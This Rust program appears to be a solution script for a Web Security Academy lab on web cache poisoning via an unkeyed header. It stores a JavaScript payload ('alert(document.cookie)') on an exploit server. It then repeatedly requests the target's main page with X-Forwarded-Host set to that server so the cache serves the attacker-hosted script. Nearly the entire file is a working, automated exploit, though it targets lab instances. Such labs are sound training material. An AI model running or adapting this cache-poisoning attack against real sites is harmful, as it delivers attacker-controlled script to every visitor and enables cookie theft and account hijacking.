/*************************************************************************
*
* Lab: Web cache poisoning with an unkeyed header
*
* Hack Steps:
*      1. Store the malicious javascript file on your expoit server
*      2. Send multiple request to the main page with an unkeyed header
*         pointing to your exploit server
*
**************************************************************************/
use lazy_static::lazy_static;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a640090035c48a480993524009200cf.web-security-academy.net";

// Change this to your exploit server DOMAIN
const EXPLOIT_SERVER_DOMAIN: &str = "exploit-0a3a0062033e488e800f3456010e0047.exploit-server.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Storing the malicious javascript file on your exploit server.. ");
    flush_terminal();

    store_javascript_file_on_exploit_server();

    println!("{}", "OK".green());

    // send multiple request to cache the request
    // 5 is enough
    for i in 1..=5 {
        print!("\r⦗2⦘ Poisoning the main page with an unkeyed header ({i}/5).. ");
        flush_terminal();

        poison_main_page();
    }

    println!("{}", "OK".green());
    println!("🗹 The main page is poisoned successfully");
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn store_javascript_file_on_exploit_server() {
    let response_head = "HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8";
    let js_file = "alert(document.cookie);";

    WEB_CLIENT
        .post(format!("https://{EXPLOIT_SERVER_DOMAIN}"))
        .form(&HashMap::from([
            ("formAction", "STORE"),
            ("urlIsHttps", "on"),
            ("responseFile", "/resources/js/tracking.js"),
            ("responseHead", response_head),
            ("responseBody", js_file),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to store the malicious javascript file on your exploit server".red()
        ));
}

fn poison_main_page() -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}"))
        .header("X-Forwarded-Host", EXPLOIT_SERVER_DOMAIN)
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to fetch the main page with the injected payload".red()
        ))
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
